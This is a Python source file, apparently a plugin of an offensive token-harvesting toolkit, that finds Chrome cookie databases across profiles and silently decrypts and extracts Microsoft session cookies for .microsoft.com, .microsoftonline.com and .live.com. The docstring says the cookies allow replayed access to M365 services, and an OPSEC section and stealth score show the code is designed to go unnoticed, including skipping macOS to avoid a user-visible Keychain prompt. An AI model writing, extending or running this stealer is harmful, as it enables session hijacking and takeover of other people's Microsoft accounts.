"""Microsoft browser cookie collector — extracts session cookies via Chromium decrypt.

Extracts Microsoft session cookies from Chrome's encrypted Cookies database.
Targets .microsoft.com, .microsoftonline.com, and .live.com domains.
These cookies can provide access to M365 services when replayed.

OPSEC:
  - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
  - macOS: SKIPPED by default (Keychain prompt is user-visible)
"""

from __future__ import annotations

from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import chrome_user_data_dir, get_platform


_MS_HOST_PATTERNS = [".microsoft.com", ".microsoftonline.com", ".live.com"]


@CollectorRegistry.register
class MicrosoftBrowserCookiesCollector(BaseCollector):
    service = "microsoft"
    source = "browser_cookies"
    stealth_score = 5
    requires = ["cryptography"]
    platforms = ["windows", "linux"]  # Skip macOS — Keychain prompt

    def discover(self) -> List[DiscoveredToken]:
        """Check if Chrome Cookies DB exists with Microsoft cookies."""
        results = []
        chrome_dir = chrome_user_data_dir()

        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_db = chrome_dir / profile / "Cookies"
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"

            if cookies_db.exists():
                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(cookies_db),
                    account_hint=f"chrome:{profile}",
                    stealth_score=self.stealth_score,
                    details=(
                        "Microsoft session cookies "
                        f"({', '.join(_MS_HOST_PATTERNS)}); "
                        f"platform={get_platform()}"
                    ),
                ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Extract and decrypt Microsoft session cookies from Chrome."""
        missing = self.check_dependencies()
        if missing:
            self._warn(
                f"Missing dependencies: {', '.join(missing)}. "
                f"Install with: pip install {' '.join(missing)}"
            )
            return []

        from ...core.chromium_decrypt import extract_cookies, get_chrome_key, DecryptError

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        results = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]

        for profile in profiles:
            try:
                cookies = extract_cookies(
                    profile=profile,
                    host_patterns=_MS_HOST_PATTERNS,
                    key=key,
                )
            except DecryptError as e:
                self._warn(f"Failed to extract cookies from {profile}: {e}")
                continue
            except Exception as e:
                self._warn(f"Unexpected error extracting from {profile}: {e}")
                continue

            if not cookies:
                continue

            # Group cookies by domain for organized output
            by_domain: dict = {}
            for c in cookies:
                host = c["host"]
                if host not in by_domain:
                    by_domain[host] = {}
                by_domain[host][c["name"]] = c

            # Build cookie jar dict for the extra field
            cookie_jar = {}
            for host, host_cookies in by_domain.items():
                for name, c in host_cookies.items():
                    cookie_jar[f"{host}:{name}"] = {
                        "value": c["value"],
                        "host": c["host"],
                        "path": c["path"],
                        "secure": c["secure"],
                        "httponly": c["httponly"],
                    }

            # Use the first available cookie value as the primary access_token
            # (for the CollectedToken format — full cookie jar is in extra)
            first_cookie = cookies[0]

            results.append(CollectedToken(
                service=self.service,
                source=self.source,
                stealth_score=self.stealth_score,
                access_token=secure(first_cookie["value"]),
                extra={
                    "profile": profile,
                    "cookies": cookie_jar,
                    "cookie_count": len(cookies),
                    "domains": list(by_domain.keys()),
                    "platform": get_platform(),
                },
            ))

            self._info(
                f"Extracted {len(cookies)} Microsoft cookies from "
                f"chrome:{profile} across {len(by_domain)} domains"
            )

        return results
